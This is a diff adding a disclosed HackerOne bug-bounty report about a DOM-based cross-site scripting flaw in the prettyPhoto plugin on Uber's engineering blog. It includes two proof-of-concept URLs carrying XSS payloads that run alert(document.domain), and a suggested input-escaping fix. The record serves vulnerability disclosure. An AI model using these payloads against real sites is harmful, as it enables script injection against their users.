@@ -1,0 +1,25 @@
+ReportLink:https://hackerone.com/reports/125498
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/e3xpl0it
+ReportedTo:Uber(uber)
+BountyAmount:3000.0
+Severity:
+State:Closed
+DateOfDisclosure:09.05.2016 22:27:41
+
+Summary:
+
+Hi. found dom xss on this subdomain  eng.uber.com. you are using a vulnerable plugin prettyPhoto..
+This XSS will work in Firefox,Chrome - Google and IE last version ! And this is very dangerous!
+POC 
+Firefox vector
+http://eng.uber.com/#prettyPhoto[i]/x,<svg/onload=alert(document.domain)>/x
+POC 
+Google and IE
+http://eng.uber.com/#prettyPhoto[gallery]/1,<a onclick="alert(document.domain);">/
+
+
+Add screenshot
+How to fix the vulnerability,upgrade the plugin or add the filter
+hashIndex = parseInt(hashIndex) 
+hashRel = hashRel.replace(/([ #;&,.+*~\':"!^$[]()=>|\/])/g,'\$1');
